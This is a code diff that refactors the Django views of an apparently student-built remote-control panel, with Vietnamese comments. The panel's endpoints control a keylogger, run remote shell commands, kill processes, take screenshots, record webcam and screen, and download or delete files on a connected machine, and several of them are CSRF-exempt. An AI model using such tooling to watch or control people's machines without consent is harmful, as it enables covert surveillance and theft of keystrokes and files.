@@ -2,23 +2,31 @@
 Remote Control Views - Django API Endpoints với Persistent Connection
 Sử dụng Session-based connection management và UDP Discovery
 """
-from django.shortcuts import render, redirect
-from django.http import JsonResponse, HttpResponse
+
+# ==================== IMPORTS ====================
+
+# Standard Library
+import json
+import logging
+import os
+
+# Django Core
+from django.shortcuts import render, redirect, get_object_or_404
+from django.http import JsonResponse, HttpResponse, Http404, FileResponse
 from django.views.decorators.http import require_http_methods
 from django.views.decorators.csrf import csrf_exempt
 from django.core.files.base import ContentFile
-from django.shortcuts import render, redirect, get_object_or_404
-from django.http import JsonResponse, HttpResponse, Http404, FileResponse
-import json
-import logging
-from .models import WebcamRecording
-import os
 
-# Import Persistent Client và UDP Discovery
+# Local Imports
+from .models import WebcamRecording
 from .socket_client_persistent import PersistentRemoteClient
 from .udp_discovery import UDPDiscoveryClient
 
+# ==================== LOGGER ====================
+
 logger = logging.getLogger(__name__)
+
+# ==================== HELPER FUNCTIONS ====================
 
 def _get_client(request):
     """
@@ -69,6 +77,8 @@ def cleanup_missing_recordings():
                 rec.delete()
     except Exception:
         pass
+
+# ==================== PAGE VIEWS ====================
 
 def index(request):
     """Trang chủ Tổng quan"""
@@ -302,11 +312,11 @@ def disconnect_server(request):
         return JsonResponse({"success": False, "message": str(e)}, status=500)
 
 
-# ==================== EXISTING APIs (Updated to use Persistent Client) ====================
+# ==================== PROCESS & APPLICATION APIs ====================
 
 @require_http_methods(["GET"])
 def get_keylog_status(request):
-    """API: Lấy trạng thái keylogger - DÙNG PERSISTENT CONNECTION"""
+    """API: Lấy trạng thái keylogger"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -317,7 +327,7 @@ def get_keylog_status(request):
 
 @require_http_methods(["GET"])
 def get_processes(request):
-    """API: Lấy danh sách processes - DÙNG PERSISTENT CONNECTION"""
+    """API: Lấy danh sách processes"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -329,7 +339,7 @@ def get_processes(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def kill_process(request):
-    """API: Diệt process theo ID - DÙNG PERSISTENT CONNECTION"""
+    """API: Diệt process theo ID"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -346,7 +356,7 @@ def kill_process(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def start_process(request):
-    """API: Khởi động process/application - DÙNG PERSISTENT CONNECTION"""
+    """API: Khởi động process/application"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -362,7 +372,7 @@ def start_process(request):
 
 @require_http_methods(["GET"])
 def get_apps(request):
-    """API: Lấy danh sách applications - DÙNG PERSISTENT CONNECTION"""
+    """API: Lấy danh sách applications"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -374,7 +384,7 @@ def get_apps(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def kill_app(request):
-    """API: Diệt application theo ID - DÙNG PERSISTENT CONNECTION"""
+    """API: Diệt application theo ID"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -388,9 +398,11 @@ def kill_app(request):
         return JsonResponse({"status": "error", "message": str(e)})
 
 
+# ==================== SCREENSHOT API ====================
+
 @require_http_methods(["GET"])
 def take_screenshot(request):
-    """API: Chụp màn hình - DÙNG PERSISTENT CONNECTION"""
+    """API: Chụp màn hình"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -399,9 +411,11 @@ def take_screenshot(request):
     return JsonResponse(result)
 
 
+# ==================== KEYLOGGER APIs ====================
+
 @require_http_methods(["GET"])
 def get_keylog(request):
-    """API: Lấy dữ liệu keylog - DÙNG PERSISTENT CONNECTION"""
+    """API: Lấy dữ liệu keylog"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -413,7 +427,7 @@ def get_keylog(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def hook_keylog(request):
-    """API: Bật/tắt keylogger - DÙNG PERSISTENT CONNECTION"""
+    """API: Bật/tắt keylogger"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
@@ -430,13 +444,16 @@ def hook_keylog(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def clear_keylog(request):
-    """API: Xóa dữ liệu keylog - DÙNG PERSISTENT CONNECTION"""
+    """API: Xóa dữ liệu keylog"""
     client = _get_client(request)
     if not client:
         return JsonResponse({"status": "error", "message": "Not connected to server"}, status=400)
     
     result = client.send_command("KEYLOG", "CLEAR")
     return JsonResponse(result)
+
+
+# ==================== POWER CONTROL APIs ====================
 
 @csrf_exempt
 @require_http_methods(["POST"])
@@ -482,7 +499,9 @@ def power_action_specific(request, action_type):
     except Exception as e:
         return JsonResponse({"status": "error", "message": str(e)}, status=500)
 
-# ==================== CMD APIs ====================
+
+# ==================== SHELL (CMD) APIs ====================
+
 @csrf_exempt
 @require_http_methods(["POST"])
 def execute_shell_command(request):
@@ -490,12 +509,10 @@ def execute_shell_command(request):
     client = _get_client(request)
 
     if not client:
-        # Thay vì trả về 400 (gây log đỏ), ta trả về 200 kèm status đặc biệt.
-        # Frontend JS đã có logic xử lý `status: 'disconnected'` rồi.
         return JsonResponse({
             "status": "disconnected", 
             "message": "Not connected to server"
-        }, status=200) # Trả về 200 OK để console không báo lỗi đỏ
+        }, status=200)
     
     try:
         data = json.loads(request.body)
@@ -507,7 +524,6 @@ def execute_shell_command(request):
         # Gửi lệnh qua socket
         result = client.send_command("CMD", "EXEC", cmd)
         
-        # result['data'] chứa output text từ server
         return JsonResponse(result)
         
     except Exception as e:
@@ -805,9 +821,8 @@ def webcam_delete(request, recording_id):
         logger.error(f"Delete recording error: {str(e)}")
         return JsonResponse({"success": False, "message": str(e)}, status=500)
 
-# ==================== SCREEN RECORDING APIs (MỚI) ====================
+# ==================== SCREEN RECORDING APIs ====================
 
-# --- SỬA LẠI HÀM screen_list ---
 @require_http_methods(["GET"])
 def screen_list(request):
     cleanup_missing_recordings()
@@ -915,51 +930,42 @@ def screen_stop_rec(request):
 
 @require_http_methods(["GET"])
 def screen_get_status(request):
-    """
-    API: Lấy trạng thái màn hình.
-    """
+    """API: Lấy trạng thái màn hình"""
     client = _get_client(request)
-    # SỬA LẠI: Trả về key khớp với socket client
     if not client: 
         return JsonResponse({"on": False, "rec": False})
         
     return JsonResponse(client.screen_status())
 
-# Trong file views.py
 
 @csrf_exempt
 @require_http_methods(["DELETE"])
 def screen_delete(request, recording_id):
-    """
-    API: Xóa 1 bản ghi màn hình
-    """
+    """API: Xóa 1 bản ghi màn hình"""
     try:
-        # Import đúng Model ScreenRecording
         from .models import ScreenRecording
         
         recording = ScreenRecording.objects.get(id=recording_id)
         
-        # 1. Xóa file vật lý trên ổ cứng
+        # Xóa file vật lý trên ổ cứng
         if recording.file_path:
             recording.file_path.delete()
         
-        # 2. Xóa record trong Database
+        # Xóa record trong Database
         recording.delete()
         
         return JsonResponse({"success": True, "message": "Recording deleted"})
     
     except ScreenRecording.DoesNotExist:
         return JsonResponse({"success": False, "message": "Recording not found"}, status=404)
-    
-# ==================== FILE MANAGER STRICT MODE ====================
 
-# --- CÁC API BÊN DƯỚI DÙNG CHO JAVASCRIPT ---
+
+# ==================== FILE MANAGER APIs ====================
 
 @csrf_exempt
 def file_get_drives(request):
-    """API: Lấy danh sách ổ đĩa (Có bảo vệ)"""
+    """API: Lấy danh sách ổ đĩa"""
     client = _get_client(request)
-    # CHẶN ĐỨNG nếu chưa kết nối
     if not client or not client.connected: 
         return JsonResponse({"success": False, "message": "Access Denied: Not connected"}, status=403)
     
@@ -973,7 +979,7 @@ def file_get_drives(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def file_get_dir(request):
-    """API: Lấy danh sách file (Có bảo vệ)"""
+    """API: Lấy danh sách file"""
     client = _get_client(request)
     if not client or not client.connected: 
         return JsonResponse({"success": False, "message": "Access Denied: Not connected"}, status=403)
@@ -990,7 +996,7 @@ def file_get_dir(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def file_delete(request):
-    """API: Xóa file (Có bảo vệ)"""
+    """API: Xóa file"""
     client = _get_client(request)
     if not client or not client.connected: 
         return JsonResponse({"success": False, "message": "Access Denied: Not connected"}, status=403)
@@ -1007,7 +1013,7 @@ def file_delete(request):
 @csrf_exempt
 @require_http_methods(["POST"])
 def file_download(request):
-    """API: Tải file (Có bảo vệ)"""
+    """API: Tải file"""
     client = _get_client(request)
     if not client or not client.connected: 
         return JsonResponse({"success": False, "message": "Access Denied: Not connected"}, status=403)
@@ -1025,28 +1031,23 @@ def file_download(request):
             return JsonResponse(result, status=404)
     except Exception as e:
         return JsonResponse({"success": False, "message": str(e)}, status=500)
-    
+
+
 # ==================== SYSTEM INFORMATION ====================
 
 @require_http_methods(["GET"])
 def get_server_stats(request):
-    """
-    API: Lấy thông số Dashboard
-    Frontend gọi liên tục 2s/lần
-    """
+    """API: Lấy thông số Dashboard (Frontend gọi liên tục 2s/lần)"""
     client = _get_client(request)
     
-    # 1. Nếu chưa có kết nối -> Trả về disconnected để frontend ẩn bảng
     if not client or not client.connected:
         return JsonResponse({
             "status": "disconnected",
             "message": "Client not connected"
         })
         
-    # 2. Gửi lệnh lấy info
     result = client.get_system_stats()
     
-    # 3. Nếu socket lỗi giữa chừng -> cũng báo disconnected
     if result.get("status") == "error" and "Broken pipe" in str(result.get("message")):
          return JsonResponse({"status": "disconnected"})
 
